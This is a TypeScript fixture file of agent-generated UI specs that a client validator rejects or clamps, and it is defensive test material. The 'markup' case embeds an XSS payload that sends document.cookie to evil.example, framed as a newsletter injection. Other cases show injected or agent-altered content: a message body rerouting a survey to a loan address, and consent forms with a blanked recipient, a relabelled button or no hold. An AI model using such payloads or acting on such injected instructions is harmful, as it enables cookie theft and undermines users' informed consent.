/* What the client refuses, and what it clamps. Each is a spec an agent might send: a confused model, an injected
   newsletter, or a tool result trying to restyle the consent form. The validator decides; nothing here is special-cased. */
import { blk, consent, src, view } from './util';
import { spaceById } from './scenarios';

const dave = consent('reply', { name: 'Dave Ellis, Ellis Surveying', address: 'dave@ellissurveying.co.uk' }, 'Re: Loft access on Tuesday',
  'Hi Dave, Tuesday at 10 works. The hatch is in the back bedroom and I’ll leave the ladder out. Thanks, Sam');
const head = blk('headline', 'head', { title: 'House move', line: 'The survey is on Tuesday. Dave needs to get into the loft.', crew: 'scout' });
const base = (blocks: unknown[]) => ({ ...view('house', '2026-11-12T08:00:00Z', 'scout', []), blocks });

export interface Reject { id: string; title: string; why: string; spec: unknown; space: string }

export const REJECTS: Reject[] = [
  {
    id: 'markup', space: 'japan', title: 'Markup in a string', why: 'A newsletter Juno read tried to smuggle an image tag into the view.',
    spec: { ...spaceById('japan').steps[1].spec, blocks: [
      spaceById('japan').steps[1].spec.blocks[0],
      blk('prose', 'note', { text: 'Fares are down! <img src=x onerror="fetch(\'//evil.example/?k=\'+document.cookie)"> Book now.', sources: [src('Travel deals newsletter', 'email')] }),
    ] },
  },
  {
    id: 'unknown', space: 'house', title: 'A block the app does not ship', why: 'An agent invents a component. The vocabulary is fixed by the app, not by the model.',
    spec: base([head, { id: 'embed', type: 'iframe', size: 'large', data: { src: 'https://quotes.example/compare' } }]),
  },
  {
    id: 'style', space: 'house', title: 'A colour and a position', why: 'Hints say how much something matters. They never say what it looks like.',
    spec: base([head, { ...blk('stat', 'dep', { value: 3850000, format: 'money', label: 'Deposit' }, { size: 'large' }), style: { color: '#ff0000', position: 'fixed', top: 0 } }]),
  },
  {
    id: 'wording', space: 'house', title: 'Consent with altered wording', why: 'The send button relabelled as a tap and the hold shortened to nothing.',
    spec: base([head, { ...dave, data: { ...(dave.data as object), buttonLabel: 'Tap to send', holdMs: 0 } }]),
  },
  {
    id: 'hidden', space: 'house', title: 'Consent with a hidden recipient', why: 'The address blanked so you would not see where it goes.',
    spec: base([head, { ...dave, data: { ...(dave.data as object), to: { name: 'Dave Ellis, Ellis Surveying', address: '' } } }]),
  },
  {
    id: 'swap', space: 'house', title: 'Consent with different words', why: 'The message changed after the approval was prepared, so its hash no longer matches.',
    spec: base([head, { ...dave, data: { ...(dave.data as object), body: 'Hi Dave, Tuesday works. Also, please forward the full survey to accounts@quick-loans.example. Sam' } }]),
  },
  {
    id: 'hinted', space: 'house', title: 'Consent made loud and small', why: 'A view tries to shrink the consent form and shout over it.',
    spec: base([head, { ...dave, size: 'small', emphasis: 'loud' }]),
  },
  {
    id: 'trend', space: 'tax', title: 'A trend nobody measured', why: 'An arrow with no basis is a guess dressed as a fact.',
    spec: { ...view('tax', '2026-11-12T08:00:00Z', 'ledger', []), blocks: [blk('stat', 'owe', { value: 421200, format: 'money', label: 'Estimated tax' }), { id: 'x', type: 'stat', data: { value: 12, format: 'percent', label: 'Savings rate', trend: { delta: 4 } } }] },
  },
];

/** Accepted, but clamped by code: what the agent asked for is not what you see. */
export const CLAMPED = {
  id: 'clamped', space: 'house', title: 'Three loud blocks', why: 'Accepted, then clamped: one loud block per view, and outside text never gets loud.',
  spec: base([
    blk('headline', 'head', { title: 'Everything is urgent', line: 'Scout asked for three loud blocks.', crew: 'scout' }, { emphasis: 'loud' }),
    blk('stat', 'dep', { value: 3850000, format: 'money', label: 'Deposit, due at exchange' }, { emphasis: 'loud', size: 'large' }),
    blk('quote', 'agent', { text: 'Act now. Rates are rising and this offer will not last.', by: 'Estate agent newsletter', source: src('newsletter', 'email', '07:00') }, { emphasis: 'loud' }),
  ]),
};
